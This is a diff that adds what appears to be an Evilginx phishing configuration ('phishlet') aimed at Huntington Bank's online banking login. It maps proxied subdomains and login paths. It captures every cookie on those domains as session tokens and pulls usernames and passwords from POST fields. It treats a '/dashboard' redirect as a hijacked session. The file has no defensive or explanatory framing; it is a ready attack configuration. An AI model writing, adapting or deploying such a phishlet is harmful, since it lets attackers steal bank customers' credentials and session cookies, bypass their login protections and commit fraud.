@@ -1,0 +1,42 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'huntington.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'huntington.com/mobile-login', session: false, is_landing: false}
+  - {phish_sub: 'onlinebanking', orig_sub: 'onlinebanking', domain: 'huntington.com', session: false, is_landing: false}
+  - {phish_sub: 'banking', orig_sub: 'onlinebanking', domain: 'huntington.com/rol/Auth/login.aspx', session: false, is_landing: false}
+sub_filters:
+auth_tokens:
+  - domain: '.huntington.com'
+    keys: ['.*:regexp']
+  - domain: 'huntington.com'
+    keys: ['.*:regexp']
+  - domain: '.www.huntington.com'
+    keys: ['.*:regexp']
+  - domain: 'www.huntington.com'
+    keys: ['.*:regexp']
+  - domain: '.www.huntington.com/mobile-login'
+    keys: ['.*:regexp']
+  - domain: 'www.huntington.com/mobile-login'
+    keys: ['.*:regexp']
+  - domain: '.onlinebanking.huntington.com'
+    keys: ['.*:regexp']
+  - domain: 'onlinebanking.huntington.com'
+    keys: ['.*:regexp']
+  - domain: '.onlinebanking.huntington.com/rol/Auth/login.aspx'
+    keys: ['.*:regexp']
+  - domain: 'onlinebanking.huntington.com/rol/Auth/login.aspx'
+    keys: ['.*:regexp']
+auth_urls:
+  - '/dashboard'
+credentials:
+  username:
+    key: 'userName|email|login|UserName|username|userid|login_email|login_username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwrd|unenc_password|password|pass|login_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.huntington.com/mobile-login'
+  path: '/'
